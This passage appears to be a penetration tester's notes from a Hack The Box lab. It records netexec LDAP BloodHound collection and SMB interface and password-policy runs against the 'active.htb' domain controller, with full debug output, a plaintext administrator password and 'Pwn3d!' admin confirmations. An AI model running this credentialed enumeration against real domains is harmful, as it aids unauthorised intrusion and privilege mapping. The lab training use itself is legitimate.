[09:00:42] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling dc_list()                                                                                                                                                                                      connection.py:263
           DEBUG    Search Filter=(&(objectCategory=computer)(primaryGroupId=516))                                                                                                                                               ldap.py:625
[09:00:43] INFO     LDAP        10.129.175.223  389    DC               DC.active.htb = 10.129.175.223                                                                                                                           ldap.py:766
[09:00:43] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --bloodhound --collection All
```sh
└─$ netexec ldap 10.129.247.58 --dns-server 10.129.247.58 -u 'active.htb\administrator' -p 'Ticketmaster1968' --bloodhound --collection All --debug
[01:35:26] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server='10.129.247.58', dns_tcp=False,         netexec.py:83
                    dns_timeout=3, protocol='ldap', target=['10.129.247.58'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False,                             
                    continue_on_success=False, gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None,              
                    pem_key=None, server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389,                         
                    domain=None, local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False,                      
                    users=None, users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=True, collection='All')               
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.247.58, hostname=10.129.247.58, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.247.58 with no baseDN                                                                                                                                                            ldap.py:173
[01:35:27] DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f255f0406e0>                                                                                                                                ldap.py:177
           DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[01:35:28] INFO     Resolved domain: active.htb with dns, kdcHost: 10.10.10.100                                                                                                                                                  ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.247.58', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                 database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[01:35:28] INFO     LDAP        10.129.247.58   389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.247.58 [3]                                                                                                                                    ldap.py:432
[01:35:29] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[01:35:30] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[01:35:30] INFO     LDAP        10.129.247.58   389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling bloodhound()                                                                                                                                                                                   connection.py:263
[01:35:30] INFO     LDAP        10.129.247.58   389    DC               Resolved collection methods: psremote, localadmin, trusts, objectprops, dcom, group, session, acl, rdp, container                                       ldap.py:1223
           DEBUG    Using DNS to retrieve domain information                                                                                                                                                                    ldap.py:1225
           DEBUG    Querying domain controller information from DNS                                                                                                                                                            domain.py:690
           DEBUG    Using domain hint: active.htb                                                                                                                                                                              domain.py:696
           INFO     Found AD domain: active.htb                                                                                                                                                                                domain.py:709
           DEBUG    Found primary DC: dc.active.htb                                                                                                                                                                            domain.py:718
           DEBUG    Found Global Catalog server: dc.active.htb                                                                                                                                                                 domain.py:729
[01:35:31] DEBUG    Found KDC for enumeration domain: dc.active.htb                                                                                                                                                            domain.py:749
           DEBUG    Using LDAP server: dc.active.htb                                                                                                                                                                        bloodhound.py:34
           DEBUG    Using base DN: DC=active,DC=htb                                                                                                                                                                         bloodhound.py:35
           DEBUG    Using kerberos KDC: dc.active.htb                                                                                                                                                                       bloodhound.py:39
           DEBUG    Using kerberos realm: ACTIVE.HTB                                                                                                                                                                        bloodhound.py:40
           INFO     Connecting to LDAP server: dc.active.htb                                                                                                                                                                    domain.py:61
           DEBUG    Using protocol ldap                                                                                                                                                                                         domain.py:62
           DEBUG    Authenticating to LDAP server with NTLM                                                                                                                                                            authentication.py:155
[01:35:43] DEBUG    No LAPS attributes found in schema                                                                                                                                                                         domain.py:276
           DEBUG    No KeyCredentialLink attributes found in schema                                                                                                                                                            domain.py:282
[01:35:44] INFO     Found 1 domains                                                                                                                                                                                            domain.py:315
           INFO     Found 1 domains in the forest                                                                                                                                                                              domain.py:354
[01:35:45] INFO     Found 1 computers                                                                                                                                                                                          domain.py:543
           DEBUG    No support for GMSA, skipping in query                                                                                                                                                                     domain.py:451
           DEBUG    Writing users to file: DC_10.129.247.58_2025-08-06_013531_users.json                                                                                                                                  memberships.py:133
           INFO     Connecting to LDAP server: dc.active.htb                                                                                                                                                                    domain.py:61
           DEBUG    Don't care about acetype 6                                                                                                                                                                                    acls.py:67
           DEBUG    Don't care about acetype 6                                                                                                                                                                                    acls.py:67
           DEBUG    Using protocol ldap                                                                                                                                                                                         domain.py:62
           DEBUG    Authenticating to LDAP server with NTLM                                                                                                                                                            authentication.py:155
           DEBUG    Don't care about acetype 6                                                                                                                                                                                    acls.py:67
           DEBUG    Don't care about acetype 6                                                                                                                                                                                    acls.py:67
[01:35:49] DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-512                                                                                                                        objectresolver.py:130
           DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-519                                                                                                                        objectresolver.py:130
           INFO     Found 5 users                                                                                                                                                                                        outputworker.py:147
           DEBUG    Finished writing users                                                                                                                                                                                memberships.py:242
           DEBUG    Writing groups to file: DC_10.129.247.58_2025-08-06_013531_groups.json                                                                                                                                memberships.py:264
[01:35:50] DEBUG    Querying resolver LDAP for DN CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb                                                                                                              objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=Domain Admins,CN=Users,DC=active,DC=htb                                                                                                                            objectresolver.py:56
[01:35:51] DEBUG    Querying resolver LDAP for DN CN=Cert Publishers,CN=Users,DC=active,DC=htb                                                                                                                          objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=Enterprise Admins,CN=Users,DC=active,DC=htb                                                                                                                        objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=Schema Admins,CN=Users,DC=active,DC=htb                                                                                                                            objectresolver.py:56
[01:35:52] DEBUG    Querying resolver LDAP for DN CN=Domain Controllers,CN=Users,DC=active,DC=htb                                                                                                                       objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=active,DC=htb                                                                                                              objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=active,DC=htb                                                                                                             objectresolver.py:56
           DEBUG    Querying resolver LDAP for DN CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=active,DC=htb                                                                                                             objectresolver.py:56
[01:35:53] DEBUG    Querying resolver LDAP for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=active,DC=htb                                                                                                              objectresolver.py:56
           INFO     Found 41 groups                                                                                                                                                                                      outputworker.py:147
           DEBUG    Finished writing groups                                                                                                                                                                               memberships.py:347
           DEBUG    Writing GPOs to file: DC_10.129.247.58_2025-08-06_013531_gpos.json                                                                                                                                    memberships.py:426
[01:35:54] INFO     Found 2 gpos                                                                                                                                                                                         outputworker.py:147
           DEBUG    Finished writing GPO                                                                                                                                                                                  memberships.py:501
           DEBUG    Writing OU to file: DC_10.129.247.58_2025-08-06_013531_ous.json                                                                                                                                       memberships.py:512
           INFO     Found 1 ous                                                                                                                                                                                          outputworker.py:147
           DEBUG    Finished writing OU                                                                                                                                                                                   memberships.py:615
           DEBUG    Writing containers to file: DC_10.129.247.58_2025-08-06_013531_containers.json                                                                                                                        memberships.py:626
[01:35:55] DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-1101                                                                                                                       objectresolver.py:130
[01:35:58] DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-553                                                                                                                        objectresolver.py:130
[01:36:02] INFO     Found 21 containers                                                                                                                                                                                  outputworker.py:147
           DEBUG    Finished writing containers                                                                                                                                                                           memberships.py:709
           DEBUG    Opening file for writing: DC_10.129.247.58_2025-08-06_013531_domains.json                                                                                                                                  domains.py:62
           DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-498                                                                                                                        objectresolver.py:130
           DEBUG    Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-516                                                                                                                        objectresolver.py:130
[01:36:03] INFO     Found 0 trusts                                                                                                                                                                                            domains.py:154
           DEBUG    Finished writing domain info                                                                                                                                                                              domains.py:172
           INFO     Starting computer enumeration with 10 workers                                                                                                                                                            computers.py:78
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           DEBUG    Start working                                                                                                                                                                                           computers.py:283
           INFO     Querying computer: DC.active.htb                                                                                                                                                                        computers.py:288
           DEBUG    Querying computer: DC.active.htb                                                                                                                                                                        computers.py:116
           DEBUG    Resolved: 10.129.247.58                                                                                                                                                                                  computer.py:270
           DEBUG    Trying connecting to computer: DC.active.htb                                                                                                                                                             computer.py:276
           DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\srvsvc]                                                                                                                                                    computer.py:287
[01:36:06] DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\samr]                                                                                                                                                      computer.py:287
[01:36:09] DEBUG    Opening domain handle                                                                                                                                                                                    computer.py:748
[01:36:11] DEBUG    Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-500                                                                                                                                              computer.py:770
           DEBUG    Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-519                                                                                                                                              computer.py:770
           DEBUG    Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-512                                                                                                                                              computer.py:770
           DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\lsarpc]                                                                                                                                                    computer.py:287
[01:36:13] DEBUG    Resolved SID to name: ADMINISTRATOR@ACTIVE.HTB                                                                                                                                                           computer.py:859
           DEBUG    Resolved SID to name: ENTERPRISE ADMINS@ACTIVE.HTB                                                                                                                                                       computer.py:859
[01:36:14] DEBUG    Resolved SID to name: DOMAIN ADMINS@ACTIVE.HTB                                                                                                                                                           computer.py:859
           DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\samr]                                                                                                                                                      computer.py:287
[01:36:17] DEBUG    Opening domain handle                                                                                                                                                                                    computer.py:748
[01:36:19] DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\samr]                                                                                                                                                      computer.py:287
[01:36:21] DEBUG    Opening domain handle                                                                                                                                                                                    computer.py:748
[01:36:23] DEBUG    DCE/RPC binding: ncacn_np:10.129.247.58[\PIPE\samr]                                                                                                                                                      computer.py:287
[01:36:25] DEBUG    Opening domain handle                                                                                                                                                                                    computer.py:748
[01:36:27] DEBUG    No group with RID 580 exists                                                                                                                                                                             computer.py:763
           DEBUG    Write worker obtained a None value, exiting                                                                                                                                                           outputworker.py:57
           DEBUG    Write worker is done, closing files                                                                                                                                                                   outputworker.py:88
[01:36:27] INFO     LDAP        10.129.247.58   389    DC               Done in 00M 56S                                                                                                                                    bloodhound.py:110
[01:36:27] INFO     LDAP        10.129.247.58   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.247.58_2025-08-06_013531_bloodhound.zip                                                          ldap.py:1252
           DEBUG    Closing connection to: 10.129.247.58                                                                                                                                                                   connection.py:178
```




## smb
### --interfaces
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --interfaces --debug
[10:36:44] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=True, no_write_check=False, filter_shares=None, smb_sessions=False,                 
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[10:36:45] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:36:46] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[10:36:47] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[10:36:49] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[10:36:50] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[10:36:50] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:36:53] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[10:37:02] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[10:37:02] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fb58e235f60>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling interfaces()                                                                                                                                                                                   connection.py:263
[10:37:09] INFO     SMB         10.129.175.223  445    DC               -Name-      | -IP Address-    | -SubnetMask-    | -Gateway-       | -DHCP-                                                                               smb.py:1190
[10:37:12] INFO     Failed to retrieve the network interface info for {065f0c42-703a-11de-9954-806e6f6e6963}: RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.                    smb.py:1236
[10:37:17] INFO     SMB         10.129.175.223  445    DC               Local Area Connection | 10.129.175.223  | None            | 10.129.0.1      | True                                                                       smb.py:1233
[10:37:17] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --disks


### --pass-pol
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --pass-pol --debug     
[11:17:59] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=True, rid_brute=None, qwinsta=False, tasklist=False,              
                    wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None, get_file=None,                            
                    append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None, clear_obfscripts=False,                    
                    force_ps32=False, no_encode=False)                                                                                                                                                                                      
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[11:18:00] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[11:18:01] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[11:18:02] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[11:18:04] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[11:18:05] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[11:18:05] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[11:18:07] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[11:18:16] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[11:18:16] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
